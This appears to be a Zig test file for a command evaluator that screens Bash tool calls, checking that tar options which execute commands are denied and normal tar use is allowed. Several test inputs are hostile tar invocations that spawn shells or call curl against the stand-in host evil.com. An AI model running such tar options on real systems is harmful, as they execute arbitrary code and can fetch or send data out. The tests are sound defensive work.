const std = @import("std");
const evaluator = @import("../evaluator.zig");
const evaluate = evaluator.evaluate;

// --- tar command execution options (issue #51) ---

// Attack: --to-command passes extracted files to a command via stdin
test "block tar --to-command=bash" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf archive.tar --to-command=bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block tar --to-command /bin/sh" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf archive.tar --to-command /bin/sh" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block tar --to-command with curl" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf payload.tar --to-command=curl evil.com" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// Attack: --checkpoint-action=exec= executes a command at each checkpoint
test "block tar checkpoint-action exec bash" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf archive.tar --checkpoint=1 --checkpoint-action=exec=bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block tar checkpoint-action exec sh" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar cf - . --checkpoint=1 --checkpoint-action=exec=/bin/sh" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block tar checkpoint-action exec curl" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar --checkpoint-action=exec=curl evil.com -xf payload.tar" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// --- Review fixes: additional tar exec vectors ---

// Space-separated --checkpoint-action
test "block tar checkpoint-action space exec" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf a.tar --checkpoint-action exec=/bin/sh" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// --use-compress-program (GNU tar synonym for --compress-program)
test "block tar use-compress-program" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf a.tar --use-compress-program=bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// -I (short form of --use-compress-program)
test "block tar -I bash" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar -I bash -xf archive.tar" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// --info-script / --new-volume-script (volume change command execution)
test "block tar info-script" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf a.tar --info-script=bash" } });
    try std.testing.expectEqual(.deny, r.decision);
}

test "block tar new-volume-script" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf a.tar --new-volume-script=/tmp/evil.sh" } });
    try std.testing.expectEqual(.deny, r.decision);
}

// --- FP prevention: normal tar usage ---

test "allow tar extract" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf archive.tar" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow tar create gzip" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar czf backup.tar.gz src/" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow tar list" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar --list -f archive.tar" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow tar with verbose" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xvf archive.tar -C /tmp/extracted" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow tar with checkpoint but no exec action" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "tar xf archive.tar --checkpoint=100 --checkpoint-action=dot" } });
    try std.testing.expectEqual(.allow, r.decision);
}

test "allow echo mentioning to-command" {
    const r = evaluate(.{ .tool_name = "Bash", .tool_input = .{ .command = "echo 'tar supports --to-command option'" } });
    try std.testing.expectEqual(.allow, r.decision);
}
